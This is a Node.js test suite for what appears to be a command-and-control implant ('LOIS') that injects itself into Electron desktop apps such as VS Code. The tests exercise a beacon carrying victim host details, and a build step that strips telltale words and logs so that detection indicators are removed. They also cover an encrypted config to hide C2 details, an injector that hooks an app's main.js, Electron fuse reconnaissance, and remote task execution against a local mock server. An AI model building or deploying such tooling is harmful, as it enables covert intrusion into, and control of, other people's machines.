// run_tests.js — LOIS test suite (node test/run_tests.js). Zero deps.
// Covers: rc4 vector, packer round-trip, beat layout (incl. the IP byte-swap),
// template extraction, jitter envelope, artifact hygiene, and a full
// registration + task round-trip against test/mock_listener.js using the
// BUILT bundle (dist/bundle.js, built with --fixed-tokens for stable envs).
const { spawn, spawnSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const assert = require('assert');

const ROOT = path.join(__dirname, '..');
const NODE = process.execPath;
const { rc4 } = require('../src/rc4');
const { Packer, Unpacker } = require('../src/packer');
const { buildBeat } = require('../src/beat');
const { extractData } = require('../src/agent');
const { TaskReader, OutPacker, iterateTasks } = require('../src/tasks');

let passed = 0;
function ok(name) { passed++; console.log('  ok - ' + name); }
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

(async function main() {
  // 1. rc4 known-answer (RFC 6229 style vector: Key/Plaintext)
  {
    const out = rc4(Buffer.from('Plaintext'), Buffer.from('Key'));
    assert.strictEqual(out.toString('hex'), 'bbf316e8d940af0ad3');
    ok('rc4 KAT');
  }

  // 2. packer round-trip (BE)
  {
    const p = new Packer();
    p.u32(0xdeadbeef).u16(0x1234).u8(0x42).bytes(Buffer.from('ab')).str('hello');
    const u = new Unpacker(p.data());
    assert.strictEqual(u.u32(), 0xdeadbeef);
    assert.strictEqual(u.u16(), 0x1234);
    assert.strictEqual(u.u8(), 0x42);
    assert.strictEqual(u.bytes().toString(), 'ab');
    assert.strictEqual(u.str(), 'hello');
    ok('packer round-trip');
  }

  // 3. beat layout — parse with the canonical field order + ip swap
  {
    const cfg = { agent_type: 0xbe4c0149, agent_id: 0xcafe0011, sleep_delay: 30,
                  jitter_delay: 20, encrypt_key: '00112233445566778899aabbccddeeff' };
    const info = { acp: 1252, oemcp: 437, gmt_offset: 2, pid: 1337, tid: 0,
                   build_number: 22631, major_version: 10, minor_version: 0,
                   internal_ip: 0xc0a80121, is_server: false, elevated: true,
                   sys64: true, arch64: true, domain_name: 'CORP',
                   computer_name: 'WS-1', username: 'op', process_name: 'Code.exe' };
    const b = buildBeat(cfg, info, Buffer.alloc(16, 7));
    const dec = rc4(Buffer.from(b.headerValue, 'base64'), Buffer.from(cfg.encrypt_key, 'hex'));
    const u = new Unpacker(dec);
    assert.strictEqual(u.u32(), 0xbe4c0149);
    assert.strictEqual(u.u32(), 0xcafe0011);
    assert.strictEqual(u.u32(), 30);
    assert.strictEqual(u.u32(), 20);
    u.u32(); u.u32();
    assert.strictEqual(u.u16(), 1252);
    assert.strictEqual(u.u16(), 437);
    assert.strictEqual(u.u8(), 2);
    assert.strictEqual(u.u16(), 1337);
    u.u16();
    assert.strictEqual(u.u32(), 22631);
    assert.strictEqual(u.u8(), 10);
    assert.strictEqual(u.u8(), 0);
    assert.strictEqual(u.u32(), 0x2101a8c0); // 192.168.1.33 swapped (wire order)
    assert.strictEqual(u.u8(), 0b0111);      // elevated+sys64+arch64
    assert.strictEqual(u.bytes().toString('hex'), '07070707070707070707070707070707');
    assert.strictEqual(u.str(), 'CORP');
    assert.strictEqual(u.str(), 'WS-1');
    assert.strictEqual(u.str(), 'op');
    assert.strictEqual(u.str(), 'Code.exe');
    ok('beat layout + ip swap');
  }

  // 4. template extraction
  {
    const cfg = { resp_pre: '{"status": "ok", "data": "', resp_post: '","metrics": "sync"}' };
    const inner = Buffer.from([0, 1, 2, 255, 34, 39]); // latin1 binary safety
    const body = Buffer.from(cfg.resp_pre + inner.toString('latin1') + cfg.resp_post, 'latin1');
    const got = extractData(body, cfg);
    assert.deepStrictEqual([...got], [...inner]);
    ok('template extract (binary-safe)');
  }

  // 5. task stream iteration: LE in / BE out
  {
    const le = [];
    const u32le = (v) => { const b = Buffer.allocUnsafe(4); b.writeUInt32LE(v); le.push(b); };
    u32le(4); u32le(0x9999); // cmd pwd + taskId
    const payload = Buffer.concat(le);
    const size = Buffer.allocUnsafe(4); size.writeUInt32LE(payload.length, 0);
    const stream = Buffer.concat([size, payload]);
    const tasks = [...iterateTasks(stream)];
    assert.strictEqual(tasks.length, 1);
    assert.strictEqual(tasks[0].commandId, 4);
    assert.strictEqual(tasks[0].reader.u32(), 0x9999);

    const out = new OutPacker();
    out.u32(0x9999).u32(4).str('/tmp');
    const built = out.build();
    assert.strictEqual(built.readUInt32BE(0), built.length); // self-counting
    ok('task framing LE/BE');
  }

  // 5b. ticket 002: real jitter envelope + legacy quirk + working-hours math
  {
    const { jittered, workingSleepSec } = require('../src/agent');
    // real jitter: sleep=30s jitter=50% → [15000, 30000] ms
    for (let i = 0; i < 300; i++) {
      const v = jittered({ sleep_delay: 30, jitter_delay: 50 });
      assert.ok(v >= 15000 && v <= 30000, 'real jitter out of envelope: ' + v);
    }
    // legacy quirk (compat_quirk): noise is seconds-scale → [30000-14, 30000]
    for (let i = 0; i < 100; i++) {
      const v = jittered({ sleep_delay: 30, jitter_delay: 50, compat_quirk: true });
      assert.ok(v <= 30000 && v >= 29900, 'quirk envelope wrong: ' + v);
    }
    // working window 09:00–17:30 (packed: startH|startM|endH|endM)
    const wt = ((9 << 24) | (0 << 16) | (17 << 8) | 30) >>> 0;
    const at = (h, m, s = 0) => new Date(2026, 8, 23, h, m, s);
    assert.strictEqual(workingSleepSec({ working_time: wt }, at(12, 0)), 0);       // inside
    assert.strictEqual(workingSleepSec({ working_time: wt }, at(9, 0)), 0);        // window start
    assert.strictEqual(workingSleepSec({ working_time: wt }, at(8, 0)), 3600);     // before → 1h
    assert.strictEqual(workingSleepSec({ working_time: wt }, at(18, 0)), 54000);   // after → next 09:00
    assert.strictEqual(workingSleepSec({ working_time: wt }, at(17, 45)), 54900);  // past end-min → next 09:00
    assert.strictEqual(workingSleepSec({ working_time: 0 }, at(3, 0)), 0);         // unset
    ok('jitter envelope + working-hours math (002)');
  }

  // 6. build + hygiene
  {
    const r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
                               '--fixed-tokens', '--no-min', '--name', 'testbundle'],
                        { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
    const art = fs.readFileSync(path.join(ROOT, 'dist', 'testbundle.js'), 'utf8')
                  .replace('<<<PAYLOAD_DATA>>>', '');
    for (const w of ['lois', 'beacon', 'adaptix', 'implant', 'inject', 'airlock'])
      assert.ok(!art.toLowerCase().includes(w), `denylist word '${w}' in artifact`);
    assert.ok(!/^\s*log\(/m.test(art), 'log() line survived in artifact');
    assert.ok(!/^\s*\/\//m.test(art), 'comment line survived');
    assert.ok(!/(^|[ \t])\/\*/.test(art), 'block comment survived'); // "'*/*'" header string is not a comment
    ok('build + hygiene denylist');
  }

  // 6b. ticket 001: shellout code is dead-code-eliminated by default and only
  //     compiled in via --allow-shellout (needs the minify pass)
  {
    let r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
                             '--fixed-tokens', '--name', 'testmin'], { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
    let art = fs.readFileSync(path.join(ROOT, 'dist', 'testmin.js'), 'utf8');
    for (const w of ['child_process', 'tasklist', 'net session'])
      assert.ok(!art.includes(w), `shellout string '${w}' in default artifact`);
    // 003: no dev logging may survive into the shipped artifact (quiet-mode
    // off is not enough — the strings themselves are IoCs)
    for (const w of ['console.log', 'console.error', 'task parse error',
                     'reply queued', 'callback error'])
      assert.ok(!art.includes(w), `dev-log string '${w}' in default artifact`);
    r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
                         '--fixed-tokens', '--allow-shellout', '--name', 'testminsh'],
                  { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
    art = fs.readFileSync(path.join(ROOT, 'dist', 'testminsh.js'), 'utf8');
    assert.ok(art.includes('tasklist'), '--allow-shellout build lost the tasklist path');
    ok('shellout gate: default strips / --allow-shellout keeps (001)');
  }

  // 6c. ticket 004: encrypted bake — config IoCs absent from the artifact AND
  //     the baked build still runs a live round-trip (decode path works)
  {
    const port = 22000 + (process.pid % 20000);
    const bakePath = path.join(__dirname, '.test-bake.json');
    fs.writeFileSync(bakePath, JSON.stringify({
      host: '127.0.0.1', port, ssl: false, http_method: 'POST',
      uri: '/super-secret-uri.html', hb_header: 'X-Test-Hdr-zz9',
      user_agent: 'TestAgentUA/9.9 zzz',
      resp_template: '{"status": "ok", "data": "<<<PAYLOAD_DATA>>>","metrics": "sync"}',
      encrypt_key: '00112233445566778899aabbccddeeff',
      sleep_delay: 1, jitter_delay: 0, debug: true,
    }));
    const r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'build_payload.js'),
                               '--fixed-tokens', '--bake', bakePath, '--name', 'testbake'],
                        { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
    assert.ok((r.stdout || '').includes('ENCRYPTED'), 'bake was not encrypted: ' + r.stdout);
    const art = fs.readFileSync(path.join(ROOT, 'dist', 'testbake.js'), 'utf8');
    // note: the <<<PAYLOAD_DATA>>> marker literal is protocol syntax in
    // config.js's template validation — not a config IoC; not asserted here
    for (const w of ['/super-secret-uri.html', 'X-Test-Hdr-zz9', 'TestAgentUA',
                     '00112233445566778899aabbccddeeff',
                     '/content.html', 'X-Request-Id', 'Chrome/126.0.0.0'])
      assert.ok(!art.includes(w), `config string '${w}' leaked into artifact`);

    const tasksFile2 = path.join(__dirname, '.tasks2.ndjson');
    fs.writeFileSync(tasksFile2, '');
    const mock2 = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tasksFile2],
      { env: { ...process.env, LISTEN_PORT: String(port), LISTEN_HB: 'X-Test-Hdr-zz9' },
        stdio: ['ignore', 'pipe', 'pipe'] });
    let mout2 = '';
    mock2.stdout.on('data', (d) => { mout2 += d; });
    mock2.stderr.on('data', (d) => { mout2 += d; });
    await sleep(600);
    assert.ok(mout2.includes('[mock] listening'), 'mock2 up: ' + mout2);

    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbake.js')],
      { env: { ...process.env, LW_MAX_CYCLES: '12' }, stdio: ['ignore', 'pipe', 'pipe'] });
    let aout2 = '';
    agent.stdout.on('data', (d) => { aout2 += d; });
    agent.stderr.on('data', (d) => { aout2 += d; });
    const dl = Date.now() + 10000;
    while (Date.now() < dl && !mout2.includes('[reg] NEW agent')) await sleep(200);
    assert.ok(mout2.includes('[reg] NEW agent'), 'encrypted-bake registration: ' + mout2 + '\nagent: ' + aout2);
    fs.writeFileSync(tasksFile2, JSON.stringify({ cmd: 4 }) + '\n');
    const dl2 = Date.now() + 8000;
    while (Date.now() < dl2 && !mout2.includes('cmd=4')) await sleep(200);
    assert.ok(mout2.includes('cmd=4'), 'encrypted-bake pwd round-trip: ' + mout2);
    try { agent.kill('SIGKILL'); } catch (_) {}
    mock2.kill('SIGKILL');
    fs.rmSync(bakePath, { force: true });
    fs.rmSync(tasksFile2, { force: true });
    ok('encrypted bake round-trip vs mock (004)');
  }

  // 6d. injector: hook append + payload copy + --clean residue-free (005)
  {
    const os = require('os');
    const fake = fs.mkdtempSync(path.join(os.tmpdir(), 'lw-fakeapp-'));
    const resDir = path.join(fake, 'resources');
    fs.mkdirSync(path.join(resDir, 'app', 'out'), { recursive: true });
    fs.writeFileSync(path.join(resDir, 'app', 'out', 'main.js'), 'console.log("host main");\n');
    const r = spawnSync(NODE, [path.join(ROOT, 'scripts', 'inject_unpacked.js'),
                               '--app', resDir, '--payload', path.join(ROOT, 'dist', 'testbundle.js'),
                               '--name', 'support', '--target', 'app/out/main.js'], { encoding: 'utf8' });
    assert.strictEqual(r.status, 0, r.stderr + r.stdout);
    let main = fs.readFileSync(path.join(resDir, 'app', 'out', 'main.js'), 'utf8');
    assert.ok(main.includes('@@lw') && main.includes("import('file:///'"), 'hook appended');
    // ESM mains (VS Code >=1.139) have no require() — the hook must use import()
    assert.ok(!main.includes('require(process.resourcesPath'), 'hook uses require() — breaks ESM mains');
    assert.ok(fs.existsSync(path.join(resDir, 'support.js')), 'payload copied');
    const c = spawnSync(NODE, [path.join(ROOT, 'scripts', 'inject_unpacked.js'),
                               '--app', resDir, '--name', 'support', '--target', 'app/out/main.js', '--clean'],
                        { encoding: 'utf8' });
    assert.strictEqual(c.status, 0, c.stderr + c.stdout);
    main = fs.readFileSync(path.join(resDir, 'app', 'out', 'main.js'), 'utf8');
    assert.ok(!main.includes('@@lw'), 'hook removed by --clean');
    assert.ok(!fs.existsSync(path.join(resDir, 'support.js')), 'payload removed by --clean');
    assert.ok(!fs.existsSync(path.join(resDir, 'support.json')), 'sidecar removed by --clean');
    // 007: re-inject on a hooked target must be a safe no-op (single marker)
    spawnSync(NODE, [path.join(ROOT, 'scripts', 'inject_unpacked.js'),
                     '--app', resDir, '--payload', path.join(ROOT, 'dist', 'testbundle.js'),
                     '--name', 'support', '--target', 'app/out/main.js'], { encoding: 'utf8' });
    const r2 = spawnSync(NODE, [path.join(ROOT, 'scripts', 'inject_unpacked.js'),
                                '--app', resDir, '--payload', path.join(ROOT, 'dist', 'testbundle.js'),
                                '--name', 'support', '--target', 'app/out/main.js'], { encoding: 'utf8' });
    assert.ok((r2.stdout || '').includes('already hooked'), 're-inject not idempotent: ' + r2.stdout);
    main = fs.readFileSync(path.join(resDir, 'app', 'out', 'main.js'), 'utf8');
    assert.strictEqual(main.split('@@lw').length - 1, 1, 'double hook after re-inject');
    fs.rmSync(fake, { recursive: true, force: true });
    ok('injector hook + clean round-trip (005)');
  }

  // 6e. recon: fuse wire parse + route decision (013)
  {
    const os = require('os');
    const recon = require('../scripts/recon.js');
    const fake = fs.mkdtempSync(path.join(os.tmpdir(), 'lw-recon-'));
    // synthetic binary: junk + sentinel + version 1 + len 9 + bits
    const bits = '101100011';
    const bin = Buffer.concat([Buffer.alloc(1024, 0x41), Buffer.from(recon.SENTINEL),
                               Buffer.from([1, bits.length]), Buffer.from(bits)]);
    const exePath = path.join(fake, 'FakeApp.exe');
    fs.writeFileSync(exePath, bin);
    const got = recon.readFuses(exePath);
    assert.strictEqual(got.bits, bits);
    assert.strictEqual(got.fuses.runAsNode, true);
    assert.strictEqual(got.fuses.enableEmbeddedAsarIntegrityValidation, false);
    assert.strictEqual(got.fuses.onlyLoadAppFromAsar, false);
    assert.strictEqual(got.fuses.grantFileProtocolExtraPrivileges, true);
    fs.rmSync(fake, { recursive: true, force: true });
    ok('recon fuse parse (013)');
  }

  // 7. full round-trip: mock listener + built bundle agent
  {
    const port = 21000 + (process.pid % 20000);
    const tasksFile = path.join(__dirname, '.tasks.ndjson');
    fs.writeFileSync(tasksFile, '');
    const mock = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tasksFile],
      { env: { ...process.env, LISTEN_PORT: String(port) }, stdio: ['ignore', 'pipe', 'pipe'] });
    let mout = '';
    mock.stdout.on('data', (d) => { mout += d; });
    mock.stderr.on('data', (d) => { mout += d; });
    await sleep(600);
    assert.ok(mout.includes('[mock] listening'), 'mock listener up: ' + mout);

    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbundle.js')], {
      env: { ...process.env, LW_HOST: '127.0.0.1', LW_PORT: String(port),
             LW_SSL: '0', LW_SLEEP: '1', LW_JITTER: '0', LW_DEBUG: '1',
             LW_MAX_CYCLES: '20' },
      stdio: ['ignore', 'pipe', 'pipe'] });
    let aout = '';
    agent.stdout.on('data', (d) => { aout += d; });
    agent.stderr.on('data', (d) => { aout += d; });

    // wait for registration, then queue tasks (one per tick: sleep=1s)
    const deadline = Date.now() + 12000;
    while (Date.now() < deadline && !mout.includes('[reg] NEW agent')) await sleep(200);
    assert.ok(mout.includes('[reg] NEW agent'), 'registration: ' + mout + '\nagent: ' + aout);
    ok('registration over the wire');

    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 4 }) + '\n');   // pwd
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 14, path: '.' }) + '\n'); // ls
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 27, path: 'lwtest-dir' }) + '\n'); // mkdir
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 21, sub: 1, sleep: 3, jitter: 5 }) + '\n'); // sleep change
    await sleep(2500);
    fs.writeFileSync(tasksFile, JSON.stringify({ cmd: 10, method: 0 }) + '\n'); // terminate

    const dl2 = Date.now() + 8000;
    while (Date.now() < dl2 && agent.exitCode === null) await sleep(200);

    assert.ok(mout.includes('cmd=4') && mout.includes('cwd='), 'pwd reply: ' + mout);
    assert.ok(mout.includes('cmd=14') && mout.includes('ls ok=1'), 'ls reply: ' + mout);
    assert.ok(mout.includes('cmd=27') || fs.existsSync(path.join(process.cwd(), 'lwtest-dir')),
              'mkdir reply/effect');
    assert.ok(mout.includes('cmd=21'), 'profile reply');
    assert.ok(agent.exitCode !== null || mout.includes('cmd=10'), 'terminate honored');
    try { agent.kill('SIGKILL'); } catch (_) {}
    mock.kill('SIGKILL');
    fs.rmSync(tasksFile, { force: true });
    fs.rmSync(path.join(process.cwd(), 'lwtest-dir'), { recursive: true, force: true });
    ok('task round-trip (pwd/ls/mkdir/sleep/terminate)');
  }

  // 8. fault injection (ticket 003): the agent must survive every chaos mode
  //    without crashing (exit 0 via MAX_CYCLES) and without a fatal print
  for (const chaos of ['reset', 'garbage', 'badkey', 'badtask']) {
    const port = 23000 + (process.pid % 20000) + chaos.length;
    const tf = path.join(__dirname, `.chaos-${chaos}.ndjson`);
    fs.writeFileSync(tf, JSON.stringify({ cmd: 4 }) + '\n'); // something to corrupt
    const mock = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tf],
      { env: { ...process.env, LISTEN_PORT: String(port), CHAOS: chaos },
        stdio: ['ignore', 'pipe', 'pipe'] });
    let mout = '';
    mock.stdout.on('data', (d) => { mout += d; });
    mock.stderr.on('data', (d) => { mout += d; });
    await sleep(500);
    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbundle.js')], {
      env: { ...process.env, LW_HOST: '127.0.0.1', LW_PORT: String(port),
             LW_SSL: '0', LW_SLEEP: '1', LW_JITTER: '0', LW_MAX_CYCLES: '4' },
      stdio: ['ignore', 'pipe', 'pipe'] });
    let aout = '';
    agent.stdout.on('data', (d) => { aout += d; });
    agent.stderr.on('data', (d) => { aout += d; });
    const dl = Date.now() + 15000;
    while (Date.now() < dl && agent.exitCode === null) await sleep(200);
    assert.strictEqual(agent.exitCode, 0, `chaos=${chaos}: agent crashed/hung: ${aout}\nmock: ${mout}`);
    assert.ok(!aout.includes('fatal'), `chaos=${chaos}: fatal print: ${aout}`);
    try { agent.kill('SIGKILL'); } catch (_) {}
    mock.kill('SIGKILL');
    fs.rmSync(tf, { force: true });
    ok(`fault injection: ${chaos}`);
  }

  // 8b. fs error frame (EACCES/ENOENT) — task errors must not kill the loop
  {
    const port = 24000 + (process.pid % 20000);
    const tf = path.join(__dirname, '.err.ndjson');
    fs.writeFileSync(tf, '');
    const mock = spawn(NODE, [path.join(__dirname, 'mock_listener.js'), '--tasks', tf],
      { env: { ...process.env, LISTEN_PORT: String(port) }, stdio: ['ignore', 'pipe', 'pipe'] });
    let mout = '';
    mock.stdout.on('data', (d) => { mout += d; });
    mock.stderr.on('data', (d) => { mout += d; });
    await sleep(500);
    const agent = spawn(NODE, [path.join(ROOT, 'dist', 'testbundle.js')], {
      env: { ...process.env, LW_HOST: '127.0.0.1', LW_PORT: String(port),
             LW_SSL: '0', LW_SLEEP: '1', LW_JITTER: '0', LW_MAX_CYCLES: '6' },
      stdio: ['ignore', 'pipe', 'pipe'] });
    let aout = '';
    agent.stdout.on('data', (d) => { aout += d; });
    agent.stderr.on('data', (d) => { aout += d; });
    const dl = Date.now() + 10000;
    while (Date.now() < dl && !mout.includes('[reg] NEW agent')) await sleep(200);
    assert.ok(mout.includes('[reg] NEW agent'), 'err-frame registration: ' + mout + aout);
    fs.writeFileSync(tf, JSON.stringify({ cmd: 24, path: '/root/definitely-not-here.bin' }) + '\n');
    const dl2 = Date.now() + 8000;
    while (Date.now() < dl2 && !mout.includes('cmd=286392319')) await sleep(200);
    assert.ok(mout.includes('cmd=286392319'), 'expected ERROR frame for unreadable cat: ' + mout);
    try { agent.kill('SIGKILL'); } catch (_) {}
    mock.kill('SIGKILL');
    fs.rmSync(tf, { force: true });
    ok('fs error frame (cat unreadable path)');
  }

  console.log(`\n${passed} passed`);
})().catch((e) => { console.error('FAIL:', e); process.exit(1); });
